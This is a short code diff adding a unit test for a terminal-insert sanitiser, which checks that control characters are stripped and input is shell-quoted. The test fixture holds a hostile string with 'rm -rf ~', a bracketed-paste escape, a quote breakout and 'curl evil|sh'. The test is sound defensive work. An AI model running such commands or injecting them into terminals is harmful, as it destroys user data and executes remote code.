@@ -67,3 +67,16 @@ describe("insert into terminal", () => {
     expect(pickTerminalId([{ terminal_id: "term-1", status: "exited" }])).toBeNull();
   });
 });
+
+describe("terminal insert sanitising", () => {
+  it("drops control characters and quotes the rest as one inert word", async () => {
+    const { MAX_INSERT_CHARS, sanitizeInsertText } = await import("./terminalInsert");
+    const hostile = "a\r\nrm -rf ~\u001b[201~\u0003\u0085b'; curl evil|sh #";
+    const out = sanitizeInsertText(hostile);
+    expect(out).not.toMatch(/[\u0000-\u001f\u007f-\u009f]/);
+    expect(out.startsWith("'")).toBe(true);
+    expect(out.endsWith("'")).toBe(true);
+    expect(out).toContain("'\\''");
+    expect(sanitizeInsertText("x".repeat(1000)).length).toBe(MAX_INSERT_CHARS + 2);
+  });
+});
